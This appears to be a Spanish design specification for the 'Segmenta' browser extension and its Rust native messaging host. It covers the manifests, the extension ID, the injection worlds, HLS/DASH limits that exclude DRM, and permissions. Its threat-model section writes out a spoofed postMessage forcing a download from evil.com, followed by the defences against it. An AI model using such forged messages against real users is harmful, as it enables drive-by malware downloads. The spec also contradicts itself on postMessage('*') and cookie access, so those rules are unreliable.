# OpenSpec 09: Extensión WebExtension, Seguridad de Native Messaging y Alcance Streaming

> **Especificación:** OPENSPEC-SEGMENTA-009  
> **Versión:** 1.0.0  
> **Área:** Integración con Navegadores, Seguridad Web, Host Nativo y Límites Legales de Streaming

---

## 1. Separación de Manifiestos de Native Messaging

Chrome y Firefox utilizan sintaxis incompatibles para autorizar extensiones en el protocolo de Native Messaging:

### 1.1. Manifiesto para Chromium, Google Chrome, Brave y Microsoft Edge
* **Ruta de Usuario:**  
  `~/.config/google-chrome/NativeMessagingHosts/io.github.wilkin.segmenta.json`  
  (Para Brave: `~/.config/BraveSoftware/Brave-Browser/NativeMessagingHosts/...`)
* **Contenido:**
```json
{
  "name": "io.github.wilkin.segmenta",
  "description": "Host de mensajería nativa para Segmenta en Ubuntu",
  "path": "/usr/bin/segmenta-host",
  "type": "stdio",
  "allowed_origins": [
    "chrome-extension://pckgeibhnafflabocmkhogkgcknhmbf/"
  ]
}
```

### 1.2. Manifiesto para Mozilla Firefox
* **Ruta de Usuario:**  
  `~/.mozilla/native-messaging-hosts/io.github.wilkin.segmenta.json`
* **Contenido:**
```json
{
  "name": "io.github.wilkin.segmenta",
  "description": "Host de mensajería nativa para Segmenta en Ubuntu",
  "path": "/usr/bin/segmenta-host",
  "type": "stdio",
  "allowed_extensions": [
    "segmenta@wilkin.github.io"
  ]
}
```

---

## 2. Clave Fija de Desarrollador e Identificador Determinista

### 2.0. Entornos de desarrollo y producción
La clave de la extensión y el ID deben ser **estables por entorno**, no un literal copiado a mano:

- **Desarrollo:** se genera un par de claves de desarrollo y se guarda su parte pública en
  `extension/dev-key.pub`; el ID resultante se usa en el manifiesto nativo de desarrollo.
- **Producción:** la clave se genera una vez, se respalda fuera del repo y se publica en el manifiesto;
  el ID de la Chrome Web Store se documenta y se usa en `/etc/opt/chrome/native-messaging-hosts/`.
- El `key` de este documento es un ejemplo. Si no coincide con el ID declarado, Chrome asigna otro ID y
  el Native Host deja de autorizar la extensión. El build debe verificar la correspondencia clave/ID.
- Firefox usa `browser_specific_settings.gecko.id`; no se reutiliza el ID de Chrome.

La clave de la extensión no es un secreto de seguridad del usuario: es pública y sólo fija el ID. La
clave privada de firma de la Chrome Web Store sí es un secreto y nunca se commitea.


Para evitar que el ID de la extensión cambie en cada instalación local o empaquetado:
* En Chromium, `manifest.json` incluye una clave pública RSA fija (`"key"`):
  ```json
  {
    "manifest_version": 3,
    "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0s7hF..."
  }
  ```
* Esto garantiza que el navegador genere siempre el mismo ID unívoco (`pckgeibhnafflabocmkhogkgcknhmbf`), coincidiendo exactamente con el campo `allowed_origins` del host nativo.
* En Firefox, la clave se define en:
  ```json
  "browser_specific_settings": {
    "gecko": {
      "id": "segmenta@wilkin.github.io"
    }
  }
  ```

---

## 3. Inyección en `world: "MAIN"` y Seguridad contra Inyección Web

### 3.1. Inyección de Contexto en Manifest V3
A partir de Chromium 111+, la especificación Manifest V3 permite declarar scripts directamente en el contexto principal de la página (`world: "MAIN"`), eliminando hacks inseguros de inserción de etiquetas `<script>` en el DOM:

```json
"content_scripts": [
  {
    "matches": ["<all_urls>"],
    "js": ["document.js"],
    "run_at": "document_start",
    "world": "MAIN",
    "all_frames": true
  },
  {
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_start",
    "world": "ISOLATED",
    "all_frames": true
  }
]
```

### 3.2. Prevención de Falsificación de Eventos (`MessageChannel`)
* **Vulnerabilidad Potencial:** Un sitio web malicioso podría emitir `window.postMessage({source: "segmenta-sniffer", url: "https://evil.com/malware.iso"})` para forzar descargas arbitrarias.
* **Solución de Seguridad Obligatoria:**
  1. Durante la carga de la página, `content.js` (entorno aislado) crea una instancia privada de **`MessageChannel`**:
     ```javascript
     const channel = new MessageChannel();
     window.postMessage({ type: "SEGMENTA_HANDSHAKE" }, "*", [channel.port2]);
     channel.port1.onmessage = (event) => {
         // Procesar evento verificado desde el puerto privado
         handleMediaDetected(event.data);
     };
     ```
  2. `document.js` recibe el puerto en el evento inicial y envía todos los eventos exclusivamente a través de ese `MessagePort`.
  3. El `MessagePort` reduce el ruido entre extensiones y páginas, pero **no sustituye la autorización**:
     cualquier script de la página puede observar el `postMessage` inicial y competir por el puerto. Por eso
     `content.js` no debe ejecutar una descarga por el solo hecho de recibir un mensaje: exige un gesto
     explícito del usuario, valida que la URL sea `http(s)` y que el esquema no sea `file:`/`javascript:`,
     y el daemon vuelve a validar URL, SSRF y destino. Un `postMessage` con `"*"` no es una frontera de
     seguridad.

---

## 4. Implementación Completa del Host Nativo (`segmenta-host`)

El host nativo en Rust procesa mensajes continuamente por `stdin` respetando **little-endian** y reenviándolos al socket Unix:

```rust
use std::error::Error;
use std::io::{self, Read, Write};
use std::os::unix::net::UnixStream;

const MAX_MESSAGE_SIZE: usize = 1024 * 1024; // 1 MiB

fn main() -> Result<(), Box<dyn Error>> {
    let mut stdin = io::stdin().lock();
    let mut stdout = io::stdout().lock();

    // Conectar al socket Unix del daemon de Segmenta
    let socket_path = std::env::var("XDG_RUNTIME_DIR")
        .map(|p| format!("{}/segmenta/daemon.sock", p))
        .unwrap_or_else(|_| format!("/run/user/{}/segmenta/daemon.sock", nix::unistd::getuid()));

    let mut stream = UnixStream::connect(&socket_path)?;

    // Bucle continuo de Native Messaging
    let mut length_buf = [0u8; 4];
    while stdin.read_exact(&mut length_buf).is_ok() {
        // Little-Endian obligatorio según la especificación de Chromium
        let length = u32::from_le_bytes(length_buf) as usize;

        if length == 0 || length > MAX_MESSAGE_SIZE {
            eprintln!("Error: Longitud de mensaje inválida: {}", length);
            break;
        }

        let mut payload = vec![0u8; length];
        stdin.read_exact(&mut payload)?;

        // Reenviar al daemon con delimitador de salto de línea
        payload.push(b'\n');
        stream.write_all(&payload)?;

        // Leer respuesta del daemon (NDJSON)
        let mut response_bytes = Vec::new();
        let mut reader = io::BufReader::new(&stream);
        use io::BufRead;
        reader.read_until(b'\n', &mut response_bytes)?;

        if response_bytes.ends_with(b"\n") {
            response_bytes.pop();
        }

        // Responder al navegador por stdout
        let resp_len = (response_bytes.len() as u32).to_le_bytes();
        stdout.write_all(&resp_len)?;
        stdout.write_all(&response_bytes)?;
        stdout.flush()?;
    }

    Ok(())
}
```

---

## 5. Alcance Técnico y Legal de Streaming (HLS / DASH)

### 5.1. Límites Legales y Cumplimiento de Tratados Internacionales
Segmenta establece un límite funcional estricto para evitar violaciones de derechos de autor y de la sección 1201 de la DMCA (*Anti-Circumvention Rule*):

* **Soportado y Permitido en v1:**
  * Flujos HLS (`.m3u8`) y MPEG-DASH (`.mpd`) públicos **sin cifrar** (`EXT-X-KEY:METHOD=NONE` y sin `ContentProtection`).
  * El cifrado AES-128/SAMPLE-AES de HLS y cualquier `ContentProtection` quedan fuera de v1: requieren
    gestión de claves y no se deben presentar como “cifrado libre”.
* **Estrictamente Fuera de Alcance (*Out of Scope*):**
  * Mecanismos de Gestión de Derechos Digitales (**DRM**): Google Widevine, Apple FairPlay, Microsoft PlayReady y ClearKey cerrado.
  * **Comportamiento Ante Streams con DRM:** Si el parser detecta etiquetas de protección `#EXT-X-KEY` con métodos distintos a `NONE` o bloques `<ContentProtection>` con esquemas DRM cerrados, el motor **aborta inmediatamente la captura** y muestra una notificación:  
    *"Este contenido utiliza protección DRM no compatible con Segmenta."*

### 5.2. Pipeline Concurrente de Descarga y Fusión sin Pérdida
Para transmisiones públicas permitidas:
1. El parser extrae la lista de fragmentos `.ts` o `.m4s` de audio y video.
2. Cada fragmento se descarga mediante workers concurrentes.
3. Se genera un archivo de lista para concatenación:
   ```txt
   ffconcat version 1.0
   file 'chunk_001.m4s'
   file 'chunk_002.m4s'
   ```
4. **Segmento de inicialización:** en fMP4 se descarga y se coloca primero el `init` referenciado por
   `EXT-X-MAP`/`SegmentTemplate.initialization`; sin él, concatenar `.m4s` produce un archivo inválido.
5. Se ejecuta FFmpeg en modo de copia directa de flujo sin recodificación (*stream copy*):
   ```bash
   ffmpeg -y -f concat -safe 0 -i video_list.txt -f concat -safe 0 -i audio_list.txt -c copy -movflags +faststart salida.mp4
   ```
6. Esto preserva la calidad original y evita recodificar. Las listas, el init y la ejecución se hacen
   con `tokio::process::Command` y argumentos, nunca con un string pasado a una shell.
7. **Fuera de alcance v1:** DRM, AES-128/SAMPLE-AES, live con ventanas móviles, subtítulos y pistas
   múltiples. Un manifiesto fuera de alcance se rechaza antes de descargar un solo fragmento.

---

## 6. Permisos mínimos y consentimiento

La extensión no debe pedir permisos “por si acaso”. La matriz de v1 es:

| Permiso | Uso | Límite |
| --- | --- | --- |
| `nativeMessaging` | Hablar con `segmenta-host` | Sólo el host `io.github.wilkin.segmenta` |
| `cookies` | Enviar cookies de la descarga capturada | Se leen sólo para el dominio de la URL y se borran al completar/cancelar |
| `contextMenus` | “Descargar con Segmenta” | Sólo ítem de menú contextual |
| `storage` | Preferencias de la extensión | Sin secretos ni historial |
| `scripting` | Inyectar el sniffer bajo demanda | Sólo en pestañas donde el usuario activó el panel |
| `webRequest`/`declarativeNetRequest` | Detectar descargas | Preferir `declarativeNetRequest`; no bloquear tráfico ajeno |
| `downloads` | Cancelar la descarga nativa si el usuario la reemplaza | Sólo tras confirmación |
| `host_permissions` | Captura | No usar `<all_urls>` en producción si la tienda lo rechaza; permitir dominios opt-in |

La extensión debe mostrar una pantalla de consentimiento antes de leer cookies o enviar una URL al
host, y registrar en el daemon sólo la URL y las cabeceras necesarias. Un permiso nuevo requiere
revisión de seguridad y un OpenSpec, no un cambio silencioso del manifest.

---

## 12. Alcance de seguridad en 0.1.0

- **Permisos mínimos**: `nativeMessaging`, `storage`, `activeTab` y `scripting`; `host_permissions`
  sólo `https://www.youtube.com/*`. Los sitios para HLS/DASH se habilitan con permiso opcional por
  sitio, nunca con `<all_urls>`.
- **ID de desarrollo**: la `key` del manifiesto MV3 es pública y fija; el ID derivado se documenta en
  `extension/CHROMIUM-ID.txt` y debe coincidir con `allowed_origins`. En Firefox el ID es
  `segmenta@wilkin.github.io` y el manifiesto nativo usa `allowed_extensions`.
- **Mensajería**: el `background` valida remitente (mismo ID de extensión), tipo de mensaje, esquema
  y host de la URL y tamaño (< 64 KiB). `document.js` entrega eventos por `MessageChannel` a un puerto
  concreto, comprobando `event.source === window`; nunca `postMessage("*")`.
- **Sin credenciales**: la extensión no lee cookies ni `localStorage` del sitio, no reenvía
  `Authorization` y no descarga contenido privado o con edad.
- **Sin DRM**: claves HLS (`EXT-X-KEY` ≠ `NONE`) y `ContentProtection` de DASH se rechazan con
  `ERR_DRM_PROTECTED`; no se implementa ningún bypass.
- **Sin código remoto**: no hay `eval`, `new Function`, scripts remotos ni dependencias npm en tiempo
  de ejecución; el ZIP contiene sólo archivos locales.
- **Host**: sin shell, sin rutas del navegador, allowlist de métodos y mensajes de error sin datos
  sensibles.
- **Firefox sin firma**: se carga temporalmente desde `about:debugging`; no se distribuye por la
  tienda de Mozilla en 0.1.0.
